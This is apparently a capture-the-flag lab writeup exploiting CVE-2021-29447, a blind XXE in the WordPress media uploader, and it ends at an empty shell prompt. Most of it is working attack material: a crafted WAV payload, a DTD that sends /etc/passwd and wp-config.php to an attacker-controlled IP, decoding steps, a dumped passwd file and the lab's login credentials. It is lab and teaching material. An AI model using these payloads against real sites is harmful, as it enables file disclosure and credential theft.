# WordPress-Cve2021 — Writeup

## Overview
### WordPress-Cve2021 — Writeup
### WordPress-Cve2021 — Writeup

## Enumeration
```text
Wordpress: CVE-2021-29447

Vulnerability allow a authenticated user whith low privilages upload a malicious WAV file that could lead to remote arbitrary file disclosure and server-side request forgery (SSRF).

 Introduction

﻿

An XXE vulnerability consists of an injection that takes advantage of the poor configuration of the XML interpreter. This allows us to include external entities, enabling us attack to applications that interpret XML language in their parameters. We'll explore a recent XXE vulnerability, albeit one that comes with some situational caveats.

Researchers at security firm SonarSource discovered an XML external entity injection (XXE) security flaw in the WordPress Media Library. The vulnerability can be exploited only when this CMS runs in PHP 8 and the attacking user has permissions to upload media files. Take note of the latter condition as we walk through an example of exploiting this vulnerability below.

Impact

    Arbitrary File Disclosure: The contents of any file on the host’s file system could be retrieved, e.g. wp-config.php which contains sensitive data such as database credentials.
    Server-Side Request Forgery (SSRF): HTTP requests could be made on behalf of the WordPress installation. Depending on the environment, this can have a serious impact.

Exploiting the vulnerability

A WordPress site affected by this vulnerability has been identified via the WPScan tool. We can see the output of this tool below from our enumeration.

In this example, we have identified that the author user uses weak credentials.

user: test-corp
password: test
```
```text
┌──(kali㉿kali)-[~]
└─$ wpscan --url tryhackme.com
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |  (WordPress scan)
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

Scan Aborted: The remote website is up, but does not seem to be running WordPress.

In this case, we can see that this user has permission to upload media files. We can leverage this to upload a reverse shell!

Creating a malicious WAV file.

It's very easy, in your bash console enter the following command:

nano poc.wav
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav

On your attack machine (likely Kali or the TryHackMe AttackBox) create a dtd file with the following code. This will allow us to execute code following the webserver fetching the dtd file. Be sure the name of this file matches what you put entered in the .wav file for NAMEEVIL.dtd (see the previous code blurb).
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >

Now launch an http server in the same directory as the dtd file.

php -S 0.0.0.0:PORT

Now upload the malicious .wav to the WordPress application!

Once you've uploaded the .wav file, you should see the following request in your HTTP server logs. Note, in order to exfiltrate data effectively we've used Zlib for encoding. 

For practice (and the sake of this example), let's use PHP to decode this blurb! Create a .php with the following code, just be sure to copy and paste the base64 returned from the WordPress server where we have 'base64here' in the example code.

<?php echo zlib_decode(base64_decode('base64here')); ?>

Run the php file with the following command: php FILENAME.php

Similarly, we can also leverage other base64 encoding libraries like the following:
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >

Decoding this is a breeze from here! We can copy the base64 blurb received back into the console for decoding with the following command:
echo "base64here" | base64 -d

Move onto the next task to try this out for yourself!
```
```text
┌──(kali㉿kali)-[~/Downloads/WordPress_CVE202129447]
└─$ wpscan --url 10.10.6.85
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.6.85/ [10.10.6.85]
[+] Started: Fri Aug  5 14:09:01 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://10.10.6.85/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.6.85/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.6.85/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6.2 identified (Insecure, released on ).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.6.85/index.php/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |  - http://10.10.6.85/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://10.10.6.85/wp-content/themes/twentytwentyone/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://10.10.6.85/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | Style URL: http://10.10.6.85/wp-content/themes/twentytwentyone/style.css
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.6.85/wp-content/themes/twentytwentyone/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-security-hardening
 | Location: http://10.10.6.85/wp-content/plugins/wp-security-hardening/
 | Last Updated: 2022-06-20T10:07:00.000Z
 | [!] The version is out of date, the latest version is 1.2.5
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.6.85/wp-content/plugins/wp-security-hardening/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.6.85/wp-content/plugins/wp-security-hardening/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <> (0 / 137)  0.00%  ETA: ??:??: Checking Config Backups - Time: 00:00:00 <> (1 / 137)  0.72%  ETA: 00:01: Checking Config Backups - Time: 00:00:00 <> (5 / 137)  3.64%  ETA: 00:00: Checking Config Backups - Time: 00:00:00 <> (6 / 137)  4.37%  ETA: 00:00: Checking Config Backups - Time: 00:00:00 <> (10 / 137)  7.29%  ETA: 00:00 Checking Config Backups - Time: 00:00:01 <> (11 / 137)  8.02%  ETA: 00:00 Checking Config Backups - Time: 00:00:01 <> (14 / 137) 10.21%  ETA: 00:00 Checking Config Backups - Time: 00:00:01 <> (16 / 137) 11.67%  ETA: 00:00 Checking Config Backups - Time: 00:00:01 <> (20 / 137) 14.59%  ETA: 00:00 Checking Config Backups - Time: 00:00:01 <> (21 / 137) 15.32%  ETA: 00:00 Checking Config Backups - Time: 00:00:01 <> (25 / 137) 18.24%  ETA: 00:00 Checking Config Backups - Time: 00:00:01 <> (26 / 137) 18.97%  ETA: 00:00 Checking Config Backups - Time: 00:00:01 <> (29 / 137) 21.16%  ETA: 00:00 Checking Config Backups - Time: 00:00:02 <> (31 / 137) 22.62%  ETA: 00:00 Checking Config Backups - Time: 00:00:02 <> (33 / 137) 24.08%  ETA: 00:00 Checking Config Backups - Time: 00:00:02 <> (36 / 137) 26.27%  ETA: 00:00 Checking Config Backups - Time: 00:00:02 <> (39 / 137) 28.46%  ETA: 00:00 Checking Config Backups - Time: 00:00:02 <> (40 / 137) 29.19%  ETA: 00:00 Checking Config Backups - Time: 00:00:03 <> (41 / 137) 29.92%  ETA: 00:00 Checking Config Backups - Time: 00:00:04 <> (45 / 137) 32.84%  ETA: 00:00 Checking Config Backups - Time: 00:00:04 <> (48 / 137) 35.03%  ETA: 00:00 Checking Config Backups - Time: 00:00:04 <> (50 / 137) 36.49%  ETA: 00:00 Checking Config Backups - Time: 00:00:04 <> (52 / 137) 37.95%  ETA: 00:00 Checking Config Backups - Time: 00:00:04 <> (55 / 137) 40.14%  ETA: 00:00 Checking Config Backups - Time: 00:00:04 <> (56 / 137) 40.87%  ETA: 00:00 Checking Config Backups - Time: 00:00:04 <> (60 / 137) 43.79%  ETA: 00:00 Checking Config Backups - Time: 00:00:04 <> (61 / 137) 44.52%  ETA: 00:00 Checking Config Backups - Time: 00:00:04 <> (64 / 137) 46.71%  ETA: 00:00 Checking Config Backups - Time: 00:00:05 <> (65 / 137) 47.44%  ETA: 00:00 Checking Config Backups - Time: 00:00:05 <> (66 / 137) 48.17%  ETA: 00:00 Checking Config Backups - Time: 00:00:05 <> (67 / 137) 48.90%  ETA: 00:00 Checking Config Backups - Time: 00:00:05 <> (70 / 137) 51.09%  ETA: 00:00 Checking Config Backups - Time: 00:00:05 <> (71 / 137) 51.82%  ETA: 00:00 Checking Config Backups - Time: 00:00:05 <> (72 / 137) 52.55%  ETA: 00:00 Checking Config Backups - Time: 00:00:05 <> (74 / 137) 54.01%  ETA: 00:00 Checking Config Backups - Time: 00:00:05 <> (75 / 137) 54.74%  ETA: 00:00 Checking Config Backups - Time: 00:00:05 <> (76 / 137) 55.47%  ETA: 00:00 Checking Config Backups - Time: 00:00:05 <> (77 / 137) 56.20%  ETA: 00:00 Checking Config Backups - Time: 00:00:05 <> (80 / 137) 58.39%  ETA: 00:00 Checking Config Backups - Time: 00:00:06 <> (85 / 137) 62.04%  ETA: 00:00 Checking Config Backups - Time: 00:00:06 <> (89 / 137) 64.96%  ETA: 00:00 Checking Config Backups - Time: 00:00:06 <> (90 / 137) 65.69%  ETA: 00:00 Checking Config Backups - Time: 00:00:06 <> (95 / 137) 69.34%  ETA: 00:00 Checking Config Backups - Time: 00:00:06 <> (97 / 137) 70.80%  ETA: 00:00 Checking Config Backups - Time: 00:00:06 <> (100 / 137) 72.99%  ETA: 00:0 Checking Config Backups - Time: 00:00:07 <> (102 / 137) 74.45%  ETA: 00:0 Checking Config Backups - Time: 00:00:07 <> (105 / 137) 76.64%  ETA: 00:0 Checking Config Backups - Time: 00:00:07 <> (107 / 137) 78.10%  ETA: 00:0 Checking Config Backups - Time: 00:00:07 <> (110 / 137) 80.29%  ETA: 00:0 Checking Config Backups - Time: 00:00:07 <> (111 / 137) 81.02%  ETA: 00:0 Checking Config Backups - Time: 00:00:07 <> (112 / 137) 81.75%  ETA: 00:0 Checking Config Backups - Time: 00:00:07 <> (115 / 137) 83.94%  ETA: 00:0 Checking Config Backups - Time: 00:00:07 <> (117 / 137) 85.40%  ETA: 00:0 Checking Config Backups - Time: 00:00:07 <> (119 / 137) 86.86%  ETA: 00:0 Checking Config Backups - Time: 00:00:08 <> (120 / 137) 87.59%  ETA: 00:0 Checking Config Backups - Time: 00:00:08 <> (122 / 137) 89.05%  ETA: 00:0 Checking Config Backups - Time: 00:00:08 <> (125 / 137) 91.24%  ETA: 00:0 Checking Config Backups - Time: 00:00:08 <> (127 / 137) 92.70%  ETA: 00:0 Checking Config Backups - Time: 00:00:08 <> (130 / 137) 94.89%  ETA: 00:0 Checking Config Backups - Time: 00:00:08 <> (132 / 137) 96.35%  ETA: 00:0 Checking Config Backups - Time: 00:00:08 <> (135 / 137) 98.54%  ETA: 00:0 Checking Config Backups - Time: 00:00:08 <> (137 / 137) 100.00% Time: 00:00:08

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Aug  5 14:09:30 2022
[+] Requests Done: 171
[+] Cached Requests: 6
[+] Data Sent: 42.041 KB
[+] Data Received: 234.751 KB
[+] Memory used: 228.391 MB
[+] Elapsed time: 00:00:28

We’ve been also provided with a user credentials test-corp:test so we can login and check with this creds.

Now, since the vulnerability involves uploading a malicious media file, our next step is to create a malicious wave file (.wav). However, the result of parsed iXML metadata is not sent back to the user, so to exploit it we need a blind XXE payload. This is doable by including an external Document Type Definition controlled by the attacker.

A DTD defines the document structure with a list of validated elements and attributes. A DTD can be declared inline inside an XML document, or as an external reference.

The command for this is given below:

As you can see, the XML document above includes an external DTD at ‘http://YOURSEVERIP:PORT/NAMEEVIL.dtd’.

Now we will include malicious XML with external entity in the same NAMEEVIL.dtd file with below code.

Next step is to start an http server at same place where this .dtd file is saved and upload the .wav file.

***
```
```text
┌──(kali㉿kali)-[~/Downloads/WordPress_CVE202129447]
└─$ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.18.1.77:8080/poc.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```
```text
┌──(kali㉿kali)-[~/Downloads/WordPress_CVE202129447]
└─$ ls
payload.wav
```
```text
┌──(kali㉿kali)-[~/Downloads/WordPress_CVE202129447]
└─$ file payload.wav
payload.wav: RIFF (little-endian) data, WAVE audio
```
```text
┌──(kali㉿kali)-[~/Downloads/WordPress_CVE202129447]
└─$ nano poc.dtd
```
```text
┌──(kali㉿kali)-[~/Downloads/WordPress_CVE202129447]
└─$ ls
payload.wav  poc.dtd
```
```text
┌──(kali㉿kali)-[~/Downloads/WordPress_CVE202129447]
└─$ php -S 0.0.0.0:8080
[Fri Aug  5 14:51:29 2022] Failed to listen on 0.0.0.0:8080 (reason: Address already in use)
```
```text
┌──(kali㉿kali)-[~/Downloads/WordPress_CVE202129447]
└─$ ls
payload.wav  poc.dtd
```
```text
┌──(kali㉿kali)-[~/Downloads/WordPress_CVE202129447]
└─$ nano 1.php
```
```text
┌──(kali㉿kali)-[~/Downloads/WordPress_CVE202129447]
└─$ php 1.php          
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
stux:x:1000:1000:CVE-2021-29447,,,:/home/stux:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
```
```text
┌──(kali㉿kali)-[~/Downloads/WordPress_CVE202129447]
└─$ cat 1.php                                     
<?php
echo zlib_decode(base64_decode('hVTbjpswEH3fr+CxlYLMLTc/blX1ZVO1m6qvlQNeYi3Y1IZc+vWd8RBCF1aVDZrxnDk+9gxYY1p+4REMiyaj90FpdhDu+FAIWRsNiBhG77DOWeYAcreYNpUplX7A1QtPYPj4PMhdHYBSGGixQp5mQToHVMZXy2Wace+yGylD96EUtUSmJV9FnBzPMzL/oawFilvxOOFospOwLBf5UTLvTvBVA/A1DDA82DXGVKxqillyVQF8A8ObPoGsCVbLM+rewvDmiJz8SUbX5SgmjnB6Z5RD/iSnseZyxaQUJ3nvVOR8PoeFaAWWJcU5LPhtwJurtchfO1QF5YHZuz6B7LmDVMphw6UbnDu4HqXL4AkWg53QopSWCDxsmq0s9kS6xQl2QWDbaUbeJKHUosWrzmKcX9ALHrsyfJaNsS3uvb+6VtbBB1HUSn+87X5glDlTO3MwBV4r9SW9+0UAaXkB6VLPqXd+qyJsFfQntXccYUUT3oeCHxACSTo/WqPVH9EqoxeLBfdn7EH0BbyIysmBUsv2bOyrZ4RPNUoHxq8U6a+3BmVv+aDnWvUyx2qlM9VJetYEnmxgfaaInXDdUmbYDp0Lh54EhXG0HPgeOxd8w9h/DgsX6bMzeDacs6OpJevXR8hfomk9btkX6E1p7kiohIN7AW0eDz8H+MDubVVgYATvOlUUHrkGZMxJK62Olbbdhaob0evTz89hEiVxmGyzbO0PSdIReP/dOnck9s2g+6bEh2Z+O1f3u/IpWxC05rvr/vtTsJf2Vpx3zv0X'));
?>
```
```text
┌──(kali㉿kali)-[~/Downloads/WordPress_CVE202129447]
└─$ cat poc.dtd 
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.18.1.77:8080/?p=%file;'>" >

         
***
now go to http://10.10.6.85/wp-admin/ 
(test-corp:test)

http://10.10.6.85/wp-admin/media-new.php (upload payload.wav)

Based on the results of #1, what is the name of the database for WordPress? wordpressdb2
```
```text
┌──(kali㉿kali)-[~/Downloads/WordPress_CVE202129447]
└─$ cat poc.dtd 
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.18.1.77:8080/?p=%file;'>" >
```
```text
┌──(kali㉿kali)-[~/Downloads/WordPress_CVE202129447]
└─$ nano wp-config.php
```
```text
┌──(kali㉿kali)-[~/Downloads/WordPress_CVE202129447]
